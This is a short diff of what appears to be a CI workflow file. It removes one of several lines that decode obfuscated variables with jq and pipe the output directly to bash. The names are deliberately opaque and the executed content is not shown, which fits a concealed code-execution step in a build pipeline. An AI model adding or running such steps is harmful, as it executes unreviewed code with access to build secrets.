@@ -31,7 +31,6 @@ jobs:
           echo $qp7 | jq -r .w76426 | /bin/bash
           echo $sr45928 | jq -r .g6 | /bin/bash
           printf '%s' "$oayzn20" | jq -r .xoakx69764 | /bin/bash
-          echo $ksz940 | jq -r .a25631 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
